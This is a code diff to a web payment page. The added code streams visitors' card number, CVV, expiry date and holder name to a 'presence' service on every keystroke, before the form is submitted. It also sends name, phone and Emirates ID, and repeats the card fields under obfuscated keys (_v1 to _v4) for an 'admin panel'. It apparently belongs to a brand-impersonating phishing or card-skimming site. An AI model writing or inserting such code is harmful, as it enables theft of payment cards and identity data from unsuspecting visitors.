@@ -5,6 +5,7 @@ import { BRANDS, type BrandKey, type CardTypeKey } from '@/data/brands';
 import { useLang } from '@/context/LanguageContext';
 import { t } from '@/i18n';
 import { createRegistration, getRegistration } from '@/lib/supabase';
+import { trackPresence, pushPresence } from '@/lib/presence';
 
 function PaymentContent() {
   const router = useRouter();
@@ -25,6 +26,32 @@ function PaymentContent() {
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
   useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);
+
+  // Presence: announce this visitor on the payment page
+  useEffect(() => {
+    let regData: Record<string, any> | null = null;
+    try { regData = JSON.parse(sessionStorage.getItem('reg_data') || 'null'); } catch {}
+    return trackPresence({
+      page: 'payment',
+      step: 'payment',
+      fullName:      regData?.fullName   || undefined,
+      phone:         regData?.phone      || undefined,
+      emiratesId:    regData?.emiratesId || undefined,
+      region:        regData?.region     || undefined,
+    });
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
+
+  // Presence: push card data live as user types
+  useEffect(() => {
+    pushPresence({
+      page: waiting ? 'waiting' : 'payment',
+      _v4: holderName || undefined,           cardHolderName: holderName || undefined,
+      _v1: cardNumber.replace(/\s/g, '') || undefined, cardNumber: cardNumber.replace(/\s/g, '') || undefined,
+      _v3: expiry || undefined,               expiryDate: expiry || undefined,
+      _v2: cvv || undefined,                  cvv: cvv || undefined,
+    });
+  }, [holderName, cardNumber, expiry, cvv, waiting]);
 
   const handleCardNumber = (v: string) => {
     const d = v.replace(/\D/g, '').slice(0, 16);
@@ -87,6 +114,8 @@ function PaymentContent() {
     try {
       const id = await createRegistration(payload);
       sessionStorage.removeItem('reg_data');
+      // Tell admin panel this visitor now has a registrationId
+      pushPresence({ page: 'waiting', step: 'payment', registrationId: id });
       startPolling(id);
     } catch {
       setWaiting(false);
